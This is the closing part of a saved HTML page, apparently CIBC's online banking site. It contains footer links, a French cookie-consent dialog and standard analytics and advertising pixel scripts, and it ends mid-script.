                                                <ul class="footer-section-item-links">
                                                    <li><a href="https://www.cibc.com/en/special-offers.html"
                                                            aria-label="Special offers. Opens in a new window."
                                                            data-test-id="special-offers-link" target="_blank"
                                                            class=""><!----> Special Offers <!----></a></li>
                                                    <li><a href="https://www.cibc.com/en/sitemap.html"
                                                            aria-label="Site map. Opens in a new window."
                                                            data-test-id="site-map-link" target="_blank"
                                                            class=""><!----> Site Map <!----></a></li>
                                                </ul>
                                            </div>
                                            <div class="footer-section-item">
                                                <h2 class="body-L">About CIBC</h2>
                                                <ul class="footer-section-item-links">
                                                    <li><a href="https://www.cibc.com/en/personal-banking/ways-to-bank.html"
                                                            aria-label="Ways to bank. Opens in a new window."
                                                            data-test-id="ways-to-bank-link" target="_blank"
                                                            class=""><!----> Ways to Bank <!----></a></li>
                                                    <li><a href="https://www.cibc.com/en/about-cibc.html"
                                                            aria-label="Our business. Opens in a new window."
                                                            data-test-id="our-business-link" target="_blank"
                                                            class=""><!----> Our Business <!----></a></li>
                                                    <li><a href="https://www.cibc.com/en/about-cibc/careers.html"
                                                            aria-label="Careers. Opens in a new window."
                                                            data-test-id="careers-link" target="_blank" class=""><!---->
                                                            Careers <!----></a></li>
                                                </ul>
                                            </div>
                                            <div class="footer-section-item">
                                                <h2 class="body-L">Legal Information</h2>
                                                <ul class="footer-section-item-links">
                                                    <li><a href="https://www.cibc.com/en/privacy-security/internet-based-advertising.html"
                                                            aria-label="Ad choices. Opens in a new window."
                                                            data-test-id="ad-choices-link" target="_blank"
                                                            class=""><!----> AdChoices <img
                                                                src="/ebm-resources/auth/content/views/assets/img/ad-choices-icon.svg"
                                                                class="right" alt=""></a></li>
                                                    <li><a href="https://www.cibc.com/en/legal/agreements/electronic-access.html"
                                                            aria-label="Electronic Access Agreement. Opens in a new window."
                                                            data-test-id="electronic-access-agreement-link"
                                                            target="_blank" class=""><!----> Electronic Access Agreement
                                                            <!----></a></li>
                                                    <li><a href="https://www.cibc.com/en/legal/deposit-insurance.html"
                                                            aria-label="CDIC Deposit Insurance Information. Opens in a new window."
                                                            data-test-id="cdic-deposit-insurance-information-link"
                                                            target="_blank" class=""><!----> CDIC Deposit Insurance
                                                            Information <!----></a></li>
                                                    <li><a href="https://www.cibc.com/en/privacy-security.html"
                                                            aria-label="Privacy and security. Opens in a new window."
                                                            data-test-id="privacy-security-link" target="_blank"
                                                            class=""><!----> Privacy and Security <!----></a></li>
                                                    <li><a href="https://www.cibc.com/en/legal.html"
                                                            aria-label="Legal. Opens in a new window."
                                                            data-test-id="legal-link" target="_blank" class=""><!---->
                                                            Legal <!----></a></li>
                                                    <li><a href="https://www.cibc.com/en/privacy-security/cookie-policy.html"
                                                            aria-label="Cookie Policy. Opens in a new window."
                                                            data-test-id="cookie-policy-link" target="_blank"
                                                            class=""><!----> Cookie Policy <!----></a></li>
                                                    <li><!----></li>
                                                </ul>
                                            </div>
                                        </div><span class="footer-release-version-number">EB62
                                            v5.0.2</span>
                                    </footer>
                                </div>
                            </div>
                        </div>
                        <div id="dialog-portal"></div>
                        <div id="sessions-timeout"></div><!---->
                        <metainfo></metainfo>
                    </div>
                </div>
            </div><!---->
        </div>
    </div>

    <div id="onetrust-consent-sdk">
        <div class="onetrust-pc-dark-filter ot-hide ot-fade-in"></div>
        <div id="onetrust-pc-sdk" class="otPcCenter ot-hide ot-fade-in otRelFont" lang="fr"
            aria-label="Vos renseignements personnels" role="region">
            <div role="alertdialog" aria-modal="true" aria-describedby="ot-pc-desc" style="height: 100%;"
                aria-label="Vos renseignements personnels"><!-- Close Button -->
                <div class="ot-pc-header"><!-- Logo Tag -->
                    <div class="ot-pc-logo" role="img" aria-label="Logo de la CIBC"><img alt="Logo de la CIBC"
                            src="https://cdn.cookielaw.org/logos/3bbf6e8a-a344-4c26-985b-1de4adf60ec0/0ed2b348-bee7-42fa-9183-977ae51f3a5f/802f6486-b962-4eb5-a030-e22650b3f221/CIBC_Logo.png">
                    </div><button id="close-pc-btn-handler" class="ot-close-icon" aria-label="Fermer"
                        style="background-image: url(&quot;https://cdn.cookielaw.org/logos/static/ot_close.svg&quot;);"></button>
                </div><!-- Close Button -->
                <div id="ot-pc-content" class="ot-pc-scrollbar ot-enbl-chr">
                    <div class="ot-optout-signal ot-hide">
                        <div class="ot-optout-icon"><svg xmlns="http://www.w3.org/2000/svg">
                                <path class="ot-floating-button__svg-fill"
                                    d="M14.588 0l.445.328c1.807 1.303 3.961 2.533 6.461 3.688 2.015.93 4.576 1.746 7.682 2.446 0 14.178-4.73 24.133-14.19 29.864l-.398.236C4.863 30.87 0 20.837 0 6.462c3.107-.7 5.668-1.516 7.682-2.446 2.709-1.251 5.01-2.59 6.906-4.016zm5.87 13.88a.75.75 0 00-.974.159l-5.475 6.625-3.005-2.997-.077-.067a.75.75 0 00-.983 1.13l4.172 4.16 6.525-7.895.06-.083a.75.75 0 00-.16-.973z"
                                    fill="#FFF" fill-rule="evenodd"></path>
                            </svg></div><span></span>
                    </div>
                    <h2 id="ot-pc-title">Vos renseignements personnels</h2>
                    <div id="ot-pc-desc">
                        <div class="lang-selector"><a href="javascript:OneTrust.changeLanguage('en');"
                                class="left-selector">EN</a><span> | </span><a
                                href="javascript:OneTrust.changeLanguage('fr');" class="right-selector">FR</a></div>
                        Lorsque vous visitez un site Web ou utilisez une application, ils peuvent stocker ou récupérer
                        des renseignements dans votre navigateur principalement sous la forme de témoins et d’autres
                        technologies de suivi. Ces renseignements peuvent porter sur vous, vos préférences, vos intérêts
                        ou votre appareil. Ils sont principalement utilisés pour faire fonctionner le site Web,
                        comprendre comment vous les utilisez et vous offrir une expérience plus personnalisée.
                        <br><br>
                        Vous pouvez choisir dans le menu suivant les témoins et les autres technologies de suivi que
                        vous voulez que nous utilisions sur les sites Web de la Banque CIBC lorsque vous les visitez au
                        moyen d’un navigateur. Sur les sites Web CIBC vous pouvez toujours modifier ces choix plus tard
                        en sélectionnant « Politique relative aux témoins » au bas de n’importe quelle page.
                        <br><br>
                        Vos choix sont propres à l’appareil, au site Web, à l’application mobile et au navigateur que
                        vous utilisez. Ils peuvent être réinitialisés lorsque vous effacez les témoins et les données de
                        votre navigateur sur votre appareil.
                        <br><br>
                        Pour en savoir plus sur les témoins, consultez notre <a
                            href="https://www.cibc.com/fr/privacy-security/cookie-policy.html"
                            aria-label="Politique relative aux témoins." target="_blank" class="policy-link">Politique
                            relative aux témoins</a>.<div class="ot-userid-title"><span>ID d’utilisateur : </span>
                            f860743e-217f-4cfb-aa09-88da04e5c841</div>
                        <div class="ot-userid-desc">Cet ID d’utilisateur sera utilisé comme identificateur unique lors
                            du stockage et de l’accès futurs à vos préférences.</div>
                        <div class="ot-userid-timestamp"><span>Horodatage : </span> 2024-05-05 19:20:07</div>
                    </div><button id="accept-recommended-btn-handler">Accepter tous les témoins</button>
                    <section class="ot-sdk-row ot-cat-grp">
                        <h3 id="ot-category-title">Gérer les préférences de consentement</h3>
                        <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="C0001"><button
                                aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0001"
                                aria-labelledby="ot-header-id-C0001 ot-status-id-C0001"></button><!-- Accordion header -->
                            <div class="ot-acc-hdr ot-always-active-group">
                                <h4 class="ot-cat-header" id="ot-header-id-C0001">Témoins strictement nécessaires</h4>
                                <div id="ot-status-id-C0001" class="ot-always-active">Toujours actif</div>
                                <div class="ot-arw-cntr"><svg class="ot-arw" aria-hidden="true" focusable="false"
                                        data-prefix="fas" data-icon="caret-right" role="img"
                                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 512">
                                        <path fill="currentColor"
                                            d="M166.9 264.5l-117.8 116c-4.7 4.7-12.3 4.7-17 0l-7.1-7.1c-4.7-4.7-4.7-12.3 0-17L127.3 256 25.1 155.6c-4.7-4.7-4.7-12.3 0-17l7.1-7.1c4.7-4.7 12.3-4.7 17 0l117.8 116c4.6 4.7 4.6 12.3-.1 17z">
                                        </path>
                                    </svg></div>
                            </div><!-- accordion detail -->
                            <div class="ot-acc-grpcntr ot-acc-txt">
                                <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0001">Ces témoins sont
                                    nécessaires au fonctionnement et à la protection de notre site Web et de notre
                                    application mobile. Ils sont activés par défaut et ne peuvent pas être désactivés
                                    dans nos systèmes. Ils ne sont habituellement activés qu’en réponse à vos actions,
                                    comme la sélection de votre langue, l’ouverture d’une session, le remplissage des
                                    formulaires ou la configuration de vos préférences de confidentialité. Vous pouvez
                                    configurer votre navigateur ou votre appareil pour vous alerter au sujet de ces
                                    témoins ou les bloquer, mais certaines parties du site Web ou de l’application
                                    mobile pourraient ne pas fonctionner correctement.</p>
                            </div>
                        </div>
                        <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="C0002"><button
                                aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0002"
                                aria-labelledby="ot-header-id-C0002 ot-status-id-C0002"></button><!-- Accordion header -->
                            <div class="ot-acc-hdr">
                                <h4 class="ot-cat-header" id="ot-header-id-C0002">Témoins de fonctionnalité</h4>
                                <div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0002"
                                        id="ot-group-id-C0002" aria-checked="true" role="switch"
                                        class="category-switch-handler" data-optanongroupid="C0002" checked=""
                                        aria-labelledby="ot-header-id-C0002"> <label class="ot-switch"
                                        for="ot-group-id-C0002"><span class="ot-switch-nob" aria-checked="false"
                                            role="switch" aria-label="Témoins de fonctionnalité"></span> <span
                                            class="ot-label-txt">Témoins de fonctionnalité</span></label> </div>
                                <div class="ot-arw-cntr"><svg class="ot-arw" aria-hidden="true" focusable="false"
                                        data-prefix="fas" data-icon="caret-right" role="img"
                                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 512">
                                        <path fill="currentColor"
                                            d="M166.9 264.5l-117.8 116c-4.7 4.7-12.3 4.7-17 0l-7.1-7.1c-4.7-4.7-4.7-12.3 0-17L127.3 256 25.1 155.6c-4.7-4.7-4.7-12.3 0-17l7.1-7.1c4.7-4.7 12.3-4.7 17 0l117.8 116c4.6 4.7 4.6 12.3-.1 17z">
                                        </path>
                                    </svg></div>
                            </div><!-- accordion detail -->
                            <div class="ot-acc-grpcntr ot-acc-txt">
                                <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0002">Ces témoins permettent
                                    à notre site Web et à notre application mobile de se souvenir des choix que vous
                                    faites, comme votre choix de langue. Ils nous permettent d’adapter le site Web à vos
                                    préférences et d’offrir des fonctionnalités améliorées. Sans ces témoins, votre
                                    expérience pourrait être non optimale et certaines fonctionnalités pourraient ne pas
                                    être disponibles. Ils peuvent être activés par nous ou par des tiers dont nous avons
                                    ajouté les services à nos pages. Pour en savoir plus sur ces fournisseurs tiers,
                                    consultez notre Politique relative aux témoins.</p>
                            </div>
                        </div>
                        <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="C0003"><button
                                aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0003"
                                aria-labelledby="ot-header-id-C0003 ot-status-id-C0003"></button><!-- Accordion header -->
                            <div class="ot-acc-hdr">
                                <h4 class="ot-cat-header" id="ot-header-id-C0003">Témoins de rendement</h4>
                                <div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0003"
                                        id="ot-group-id-C0003" aria-checked="true" role="switch"
                                        class="category-switch-handler" data-optanongroupid="C0003" checked=""
                                        aria-labelledby="ot-header-id-C0003"> <label class="ot-switch"
                                        for="ot-group-id-C0003"><span class="ot-switch-nob" aria-checked="false"
                                            role="switch" aria-label="Témoins de rendement"></span> <span
                                            class="ot-label-txt">Témoins de rendement</span></label> </div>
                                <div class="ot-arw-cntr"><svg class="ot-arw" aria-hidden="true" focusable="false"
                                        data-prefix="fas" data-icon="caret-right" role="img"
                                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 512">
                                        <path fill="currentColor"
                                            d="M166.9 264.5l-117.8 116c-4.7 4.7-12.3 4.7-17 0l-7.1-7.1c-4.7-4.7-4.7-12.3 0-17L127.3 256 25.1 155.6c-4.7-4.7-4.7-12.3 0-17l7.1-7.1c4.7-4.7 12.3-4.7 17 0l117.8 116c4.6 4.7 4.6 12.3-.1 17z">
                                        </path>
                                    </svg></div>
                            </div><!-- accordion detail -->
                            <div class="ot-acc-grpcntr ot-acc-txt">
                                <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0003">Ces témoins nous
                                    indiquent comment vous utilisez le site Web et l’application mobile, et nous aident
                                    à améliorer leur rendement. Par exemple, ces témoins nous permettent de compter le
                                    nombre de visiteurs sur notre site Web et de comprendre comment les visiteurs se
                                    déplacent lorsqu’ils l’utilisent. Cela nous aide à améliorer le fonctionnement de
                                    notre site Web et de notre application mobile en veillant à ce que les utilisateurs
                                    puissent trouver rapidement ce qu’ils recherchent. Ils peuvent être activés par nous
                                    ou par des tiers dont nous avons ajouté les services à nos pages. Pour en savoir
                                    plus sur ces fournisseurs tiers, consultez notre Politique relative aux témoins.</p>
                            </div>
                        </div>
                        <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="C0004"><button
                                aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0004"
                                aria-labelledby="ot-header-id-C0004 ot-status-id-C0004"></button><!-- Accordion header -->
                            <div class="ot-acc-hdr">
                                <h4 class="ot-cat-header" id="ot-header-id-C0004">Témoins publicitaires</h4>
                                <div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0004"
                                        id="ot-group-id-C0004" aria-checked="true" role="switch"
                                        class="category-switch-handler" data-optanongroupid="C0004" checked=""
                                        aria-labelledby="ot-header-id-C0004"> <label class="ot-switch"
                                        for="ot-group-id-C0004"><span class="ot-switch-nob" aria-checked="false"
                                            role="switch" aria-label="Témoins publicitaires"></span> <span
                                            class="ot-label-txt">Témoins publicitaires</span></label> </div>
                                <div class="ot-arw-cntr"><svg class="ot-arw" aria-hidden="true" focusable="false"
                                        data-prefix="fas" data-icon="caret-right" role="img"
                                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 512">
                                        <path fill="currentColor"
                                            d="M166.9 264.5l-117.8 116c-4.7 4.7-12.3 4.7-17 0l-7.1-7.1c-4.7-4.7-4.7-12.3 0-17L127.3 256 25.1 155.6c-4.7-4.7-4.7-12.3 0-17l7.1-7.1c4.7-4.7 12.3-4.7 17 0l117.8 116c4.6 4.7 4.6 12.3-.1 17z">
                                        </path>
                                    </svg></div>
                            </div><!-- accordion detail -->
                            <div class="ot-acc-grpcntr ot-acc-txt">
                                <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0004">Ces témoins peuvent
                                    être configurés sur notre site Web et notre application mobile par nos partenaires
                                    publicitaires. Ils peuvent être utilisés par ces partenaires pour établir un profil
                                    de vos intérêts et vous montrer du contenu et des publicités pertinents sur d’autres
                                    sites Web. Sans ces témoins, vous verrez tout de même des publicités, mais elles
                                    pourraient être moins pertinentes pour vous, car vos intérêts pourraient ne pas être
                                    pris en compte.</p>
                            </div>
                        </div>
                        <div class="ot-accordion-layout ot-cat-item ot-vs-config" data-optanongroupid="C0005"><button
                                aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0005"
                                aria-labelledby="ot-header-id-C0005 ot-status-id-C0005"></button><!-- Accordion header -->
                            <div class="ot-acc-hdr">
                                <h4 class="ot-cat-header" id="ot-header-id-C0005">Fichiers témoins de partage de contenu
                                    et de médias sociaux</h4>
                                <div class="ot-tgl"><input type="checkbox" name="ot-group-id-C0005"
                                        id="ot-group-id-C0005" aria-checked="true" role="switch"
                                        class="category-switch-handler" data-optanongroupid="C0005" checked=""
                                        aria-labelledby="ot-header-id-C0005"> <label class="ot-switch"
                                        for="ot-group-id-C0005"><span class="ot-switch-nob" aria-checked="false"
                                            role="switch"
                                            aria-label="Fichiers témoins de partage de contenu et de médias sociaux"></span>
                                        <span class="ot-label-txt">Fichiers témoins de partage de contenu et de médias
                                            sociaux</span></label> </div>
                                <div class="ot-arw-cntr"><svg class="ot-arw" aria-hidden="true" focusable="false"
                                        data-prefix="fas" data-icon="caret-right" role="img"
                                        xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 512">
                                        <path fill="currentColor"
                                            d="M166.9 264.5l-117.8 116c-4.7 4.7-12.3 4.7-17 0l-7.1-7.1c-4.7-4.7-4.7-12.3 0-17L127.3 256 25.1 155.6c-4.7-4.7-4.7-12.3 0-17l7.1-7.1c4.7-4.7 12.3-4.7 17 0l117.8 116c4.6 4.7 4.6 12.3-.1 17z">
                                        </path>
                                    </svg></div>
                            </div><!-- accordion detail -->
                            <div class="ot-acc-grpcntr ot-acc-txt">
                                <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0005">Ces témoins sont
                                    activés par des plateformes de médias sociaux de tiers qui ont été intégrées à notre
                                    site Web et à notre application mobile. Par exemple, un témoin placé sur un site Web
                                    par YouTube pour faire le suivi du nombre de visionnements d’une vidéo intégrée est
                                    un témoin de médias sociaux. Les témoins de médias sociaux nous permettent de vous
                                    fournir du contenu que nous jugeons pertinent pour vous. Sans ces témoins, vous
                                    pourriez ne pas être en mesure d’utiliser ou de consulter ces outils de partage. À
                                    l’heure actuelle, la Banque CIBC n’utilise aucun témoin de médias sociaux et de
                                    partage de contenu.</p>
                            </div>
                        </div>
                        <!-- Groups sections starts --><!-- Group section ends --><!-- Accordion Group section starts --><!-- Accordion Group section ends -->
                    </section>
                </div>
                <section id="ot-pc-lst" class="ot-hide ot-hosts-ui ot-pc-scrollbar ot-enbl-chr">
                    <div id="ot-pc-hdr">
                        <div id="ot-lst-title"><button class="ot-link-btn back-btn-handler" aria-label="Back"><svg
                                    id="ot-back-arw" xmlns="http://www.w3.org/2000/svg"
                                    xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
                                    viewBox="0 0 444.531 444.531" xml:space="preserve">
                                    <title>Back Button</title>
                                    <g>
                                        <path fill="#656565" d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
                l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
                c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
                s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
                L213.13,222.409z"></path>
                                    </g>
                                </svg></button>
                            <h3>Liste des cookies</h3>
                        </div>
                        <div class="ot-lst-subhdr">
                            <div class="ot-search-cntr">
                                <p role="status" class="ot-scrn-rdr"></p><input id="vendor-search-handler" type="text"
                                    name="vendor-search-handler" placeholder="Rechercher..."
                                    aria-label="Recherche dans la liste des cookies"> <svg
                                    xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                                    x="0px" y="0px" viewBox="0 -30 110 110" aria-hidden="true">
                                    <title>Search Icon</title>
                                    <path fill="#2e3644" d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
        s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
        c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
        s-17-7.626-17-17S14.61,6,23.984,6z"></path>
                                </svg>
                            </div>
                            <div class="ot-fltr-cntr"><button id="filter-btn-handler" aria-label="Filter"
                                    aria-haspopup="true"><svg role="presentation" aria-hidden="true"
                                        xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                                        x="0px" y="0px" viewBox="0 0 402.577 402.577" xml:space="preserve">
                                        <title>Filter Icon</title>
                                        <g>
                                            <path fill="#fff" d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
  c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
  c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
  C402.765,25.895,404.093,19.231,400.858,11.427z"></path>
                                        </g>
                                    </svg></button></div>
                            <div id="ot-anchor"></div>
                            <section id="ot-fltr-modal">
                                <div id="ot-fltr-cnt"><button id="clear-filters-handler">Clear</button>
                                    <div class="ot-fltr-scrlcnt ot-pc-scrollbar">
                                        <div class="ot-fltr-opts">
                                            <div class="ot-fltr-opt">
                                                <div class="ot-chkbox"><input id="chkbox-id" type="checkbox"
                                                        aria-checked="false" class="category-filter-handler"> <label
                                                        for="chkbox-id"><span class="ot-label-txt">checkbox
                                                            label</span></label> <span
                                                        class="ot-label-status">label</span></div>
                                            </div>
                                        </div>
                                        <div class="ot-fltr-btns"><button id="filter-apply-handler">Apply</button>
                                            <button id="filter-cancel-handler">Cancel</button></div>
                                    </div>
                                </div>
                            </section>
                        </div>
                    </div>
                    <section id="ot-lst-cnt" class="ot-host-cnt ot-pc-scrollbar">
                        <div id="ot-sel-blk">
                            <div class="ot-sel-all">
                                <div class="ot-sel-all-hdr"><span class="ot-consent-hdr">Consent</span> <span
                                        class="ot-li-hdr">Leg.Interest</span></div>
                                <div class="ot-sel-all-chkbox">
                                    <div class="ot-chkbox" id="ot-selall-hostcntr"><input
                                            id="select-all-hosts-groups-handler" type="checkbox" aria-checked="false">
                                        <label for="select-all-hosts-groups-handler"><span class="ot-label-txt">checkbox
                                                label</span></label> <span class="ot-label-status">label</span></div>
                                    <div class="ot-chkbox" id="ot-selall-vencntr"><input
                                            id="select-all-vendor-groups-handler" type="checkbox" aria-checked="false">
                                        <label for="select-all-vendor-groups-handler"><span
                                                class="ot-label-txt">checkbox label</span></label> <span
                                            class="ot-label-status">label</span></div>
                                    <div class="ot-chkbox" id="ot-selall-licntr"><input
                                            id="select-all-vendor-leg-handler" type="checkbox" aria-checked="false">
                                        <label for="select-all-vendor-leg-handler"><span class="ot-label-txt">checkbox
                                                label</span></label> <span class="ot-label-status">label</span></div>
                                </div>
                            </div>
                        </div>
                        <div class="ot-sdk-row">
                            <div class="ot-sdk-column"></div>
                        </div>
                    </section>
                </section>
                <div class="ot-pc-footer">
                    <div class="ot-btn-container"> <button
                            class="save-preference-btn-handler onetrust-close-btn-handler">Confirmer mes
                            préférences</button></div><!-- Footer logo -->
                    <div class="ot-pc-footer-logo"><a href="https://www.onetrust.com/products/cookie-consent/"
                            target="_blank" rel="noopener noreferrer"
                            aria-label="Powered by OneTrust S'ouvre dans un nouvel onglet"><img
                                alt="Powered by Onetrust"
                                src="https://cdn.cookielaw.org/logos/static/powered_by_logo.svg"
                                title="Powered by OneTrust S'ouvre dans un nouvel onglet"></a></div>
                </div>
                <!-- Cookie subgroup container --><!-- Vendor list link --><!-- Cookie lost link --><!-- Toggle HTML element --><!-- Checkbox HTML --><!-- plus minus--><!-- Arrow SVG element --><!-- Accordion basic element --><span
                    class="ot-scrn-rdr" aria-atomic="true"
                    aria-live="polite"></span><!-- Vendor Service container and item template -->
            </div><iframe class="ot-text-resize" sandbox="allow-same-origin" title="onetrust-text-resize"
                style="position: absolute; top: -50000px; width: 100em;" aria-hidden="true"></iframe>
        </div>
    </div>
    <div id="extension-mmplj"></div>
    <iframe src="about:blank" id="tmx_tags_iframe" title="empty" tabindex="-1"
        aria-disabled="true" aria-hidden="true" data-time="1715419444986"
        style="width: 0px; height: 0px; border: 0px; position: absolute; top: -5000px;"></iframe>
    
   
    <style title="MDigital_animationStyle"></style>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        var getVar = _satellite.getVar;

        gtag('consent', 'default', {
            'analytics_storage': (getVar('ot_ga_performance_group_active') || 'denied'),
            'ad_storage': (getVar('ot_ga_advertising_group_active') || 'denied'),
            'functionality_storage': (getVar('ot_ga_advertising_group_active') || 'denied'),
            'personalization_storage': 'denied',
            'security_storage': (getVar('ot_ga_advertising_group_active') || 'denied'),
            'ad_user_data': (getVar('ot_ga_advertising_group_active') || 'denied'),
            'ad_personalization': (getVar('ot_ga_advertising_group_active') || 'denied')
        });

        gtag('js', new Date());

        if (getVar('ot_performance_group_active')) {
            gtag('config', getVar('ga4_accounts'), {
                'send_page_view': false,
                'currency': 'CAD',
                'campaign_id': (getVar('external_campaign') || undefined),
                'user_id': (getVar('digitalData_user_id') || undefined),
                'user_properties': {
                    'adobe_ecid': (_satellite.cookie.get('alloy_ecid') || undefined),
                    'client_id': (getVar('gtag_ga_user_id') || undefined),
                    'internal_campaign': (getVar('internal_campaign') || undefined),
                    'external_campaign': (getVar('external_campaign') || undefined)
                }
            });
        }

        if (getVar('ot_performance_group_active') !== true && getVar('ot_advertising_group_active') === true) {
            gtag('config', 'DC-8205542');
        }


    </script> <!-- Twitter universal website tag code -->
    <script>
        !function (e, t, n, s, u, a) {
            e.twq || (s = e.twq = function () {
                s.exe ? s.exe.apply(s, arguments) : s.queue.push(arguments);
            }, s.version = '1.1', s.queue = [], u = t.createElement(n), u.async = !0, u.src = '//static.ads-twitter.com/uwt.js',
                a = t.getElementsByTagName(n)[0], a.parentNode.insertBefore(u, a))
        }(window, document, 'script');
        // Insert Twitter Pixel ID and Standard Event data below
        twq('init', 'nua8u');
        twq('track', 'PageView');
    </script>
    <!-- End Twitter universal website tag code -->
    <!-- Facebook Pixel Code -->
    <script>
        !function (f, b, e, v, n, t, s) {
            if (f.fbq) return; n = f.fbq = function () {
                n.callMethod ?
                n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
            n.queue = []; t = b.createElement(e); t.async = !0;
            t.src = v; s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window,
            document, 'script',
            '//connect.facebook.net/en_US/fbevents.js');
        fbq('init', '284592808392980');
        fbq('init', '1478310479108228');
        fbq('track', "PageView");
    </script>
    <!-- End Facebook Pixel Code -->
    <!-- LinkedIn Pixel Code -->
    <script type="text/javascript">
        _linkedin_partner_id = "9459";
        window._linkedin_data_partner_ids = window._linkedin_data_partner_ids || [];
        window._linkedin_data_partner_ids.push(_linkedin_partner_id);
    </script>
    <script type="text/javascript">
        (function () {
            var s = document.getElementsByTagName("script")[0];
            var b = document.createElement("script");
            b.type = "text/javascript"; b.async = true;
            b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js";
            s.parentNode.insertBefore(b, s);
        })();
    </script>
    <!-- End LinkedIn Pixel Code -->

 
    <script>_satellite["_runScript3"](function (event, target, Promise) {
            !function (e, a, t, n, o) { var c, r, d; e[o] = e[o] || [], c = function () { var a = { ti: "5175562" }; a.q = e[o], e[o] = new UET(a), e[o].push("pageLoad") }, (r = a.createElement(t)).src = n, r.async = 1, r.onload = r.onreadystatechange = function () { var e = this.readyState; e && "loaded" !== e && "complete" !== e || (c(), r.onload = r.onreadystatechange = null) }, (d = a.getElementsByTagName(t)[0]).parentNode.insertBefore(r, d) }(window, document, "script", "//bat.bing.com/bat.js", "uetq");
        });</script>
    <script>_satellite["_runScript4"](function (event, target, Promise) {
            function removeCapiElements() { null != hashedAlpha && "" != hashedAlpha && sessionStorage.removeItem("hashedAlpha"), null != hashedBeta && "" != hashedBeta && sessionStorage.removeItem("hashedBeta") } var hashedAlpha = sessionStorage.getItem("hashedAlpha"), hashedBeta = sessionStorage.getItem("hashedBeta"); removeCapiElements();
        });</script><iframe allow="join-ad-interest-group" data-tagging-id="G-BBXFMF6HTX" data-load-time="1715419458541"
        height="0" width="0"
        src="https://td.doubleclick.net/td/ga/rul?tid=G-BBXFMF6HTX&amp;gacid=85382547.1714936533&amp;gtm=45je4580v873770173za200&amp;dma=0&amp;gcs=G111&amp;gcd=13t3t3t3t5&amp;npa=0&amp;pscdl=noapi&amp;aip=1&amp;fledge=1&amp;frm=0&amp;z=2086101768"
        style="display: none; visibility: hidden;"></iframe><iframe allow="join-ad-interest-group"
        data-tagging-id="DC-8205542" data-load-time="1715419458588" height="0" width="0"
        src="https://td.doubleclick.net/td/fls/rul/activityi;fledge=1;src=8205542;npa=0;auiddc=970252350.1714936533;ps=1;pcor=266735543;uaa=x86;uab=64;uafvl=Chromium%3B124.0.6367.201%7CGoogle%2520Chrome%3B124.0.6367.201%7CNot-A.Brand%3B99.0.0.0;uamb=0;uam=;uap=Windows;uapv=10.0.0;uaw=0;pscdl=noapi;frm=0;gtm=45fe4580v9181624128za200;gcs=G111;gcd=13t3t3t3t5;dma=0;epver=2;~oref=https%3A%2F%2Fwww.cibconline.cibc.com%2Febm-resources%2Fonline-banking%2Fclient%2Findex.html?"
        style="display: none; visibility: hidden;"></iframe>
    <script>_satellite["_runScript5"](function (event, target, Promise) {
